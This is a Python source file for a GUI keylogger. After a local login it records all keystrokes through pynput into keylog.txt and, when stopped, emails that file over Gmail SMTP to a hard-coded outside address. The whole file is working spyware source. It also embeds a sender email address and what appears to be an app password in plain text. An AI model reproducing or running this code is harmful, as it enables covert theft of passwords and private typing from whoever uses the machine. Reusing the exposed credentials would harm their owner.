from pynput import keyboard
import threading
import hashlib
import os
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
from tkinter import Tk, Label, Entry, Button, StringVar, messagebox

# Global variables
text = ""
lock = threading.Lock()  # For thread-safe operations on 'text'
credentials_file = "credentials.txt"  # File to store hashed credentials
keylog_file = "keylog.txt"  # File to store keystrokes
listener = None  # Global listener variable

# Email credentials (replace with your details)
sender_email = "99220040910@klu.ac.in"
sender_password = "gqsi ggnw tpbt pzdg"
receiver_email = "maligeafridi@gmail.com"

# Function to hash a password
def hash_password(password):
    return hashlib.sha256(password.encode()).hexdigest()

# Function to initialize credentials
def setup_credentials():
    if not os.path.exists(credentials_file):
        username = input("Enter a username: ")
        password = input("Enter a password: ")
        hashed_password = hash_password(password)
        with open(credentials_file, "w") as file:
            file.write(f"{username}\n{hashed_password}")
        print("Credentials saved. Please restart the program.")
        exit()

# Function to verify credentials
def authenticate_user(username, password):
    if not os.path.exists(credentials_file):
        setup_credentials()

    with open(credentials_file, "r") as file:
        stored_username = file.readline().strip()
        stored_hashed_password = file.readline().strip()

    hashed_password = hash_password(password)
    return username == stored_username and hashed_password == stored_hashed_password

# Function to send the log file via email
def send_log_via_email():
    try:
        # Create the email
        msg = MIMEMultipart()
        msg["From"] = sender_email
        msg["To"] = receiver_email
        msg["Subject"] = "Keylog File"

        # Attach the log file
        with open(keylog_file, "rb") as log_file:
            part = MIMEBase("application", "octet-stream")
            part.set_payload(log_file.read())
        encoders.encode_base64(part)
        part.add_header("Content-Disposition", f"attachment; filename={keylog_file}")
        msg.attach(part)

        # Connect to Gmail server and send email
        with smtplib.SMTP("smtp.gmail.com", 587) as server:
            server.starttls()
            server.login(sender_email, sender_password)
            server.sendmail(sender_email, receiver_email, msg.as_string())
        print("Log file sent successfully!")
        messagebox.showinfo("Email", "Log file sent successfully!")
    except Exception as e:
        print(f"Failed to send email: {e}")
        messagebox.showerror("Email", f"Failed to send email: {e}")

# Function to log keystrokes
def on_press(key):
    global text
    try:
        with lock:  # Ensure thread-safe access to 'text'
            if key == keyboard.Key.enter:
                text += "\n"
            elif key == keyboard.Key.tab:
                text += "\t"
            elif key == keyboard.Key.space:
                text += " "
            elif key == keyboard.Key.backspace and len(text) > 0:
                text = text[:-1]
            elif isinstance(key, keyboard.Key):  # Skip other special keys
                pass
            else:
                text += key.char if hasattr(key, 'char') else str(key).strip("'")
            # Write to file immediately
            with open(keylog_file, "a") as log_file:
                log_file.write(text)
                text = ""
    except Exception as e:
        print(f"Error in key handling: {e}")

def on_release(key):
    if key == keyboard.Key.esc:
        return False

# Function to start the keylogger
def start_keylogger():
    global listener
    listener = keyboard.Listener(on_press=on_press, on_release=on_release)
    listener.start()
    messagebox.showinfo("Keylogger", "Keylogger started! Press 'ESC' to stop.")

# Function to stop the keylogger
def stop_keylogger():
    global listener
    if listener:
        listener.stop()
        listener = None
        messagebox.showinfo("Keylogger", "Keylogger stopped!")
        send_log_via_email()

# Function to handle login
def login():
    username = username_var.get()
    password = password_var.get()

    if authenticate_user(username, password):
        messagebox.showinfo("Login", "Login successful!")
        start_button.config(state="normal")
        stop_button.config(state="normal")
    else:
        messagebox.showerror("Login", "Invalid username or password!")

# Setup GUI
app = Tk()
app.title("Keylogger Authentication")
app.geometry("400x300")

# Variables for GUI inputs
username_var = StringVar()
password_var = StringVar()

# Login Interface
Label(app, text="Username:").pack(pady=5)
Entry(app, textvariable=username_var).pack(pady=5)
Label(app, text="Password:").pack(pady=5)
Entry(app, textvariable=password_var, show="*").pack(pady=5)
Button(app, text="Login", command=login).pack(pady=20)

# Keylogger Control Buttons
start_button = Button(app, text="Start Keylogger", command=start_keylogger, state="disabled")
start_button.pack(pady=10)

stop_button = Button(app, text="Stop Keylogger", command=stop_keylogger, state="disabled")
stop_button.pack(pady=10)

# Run the app
app.mainloop()
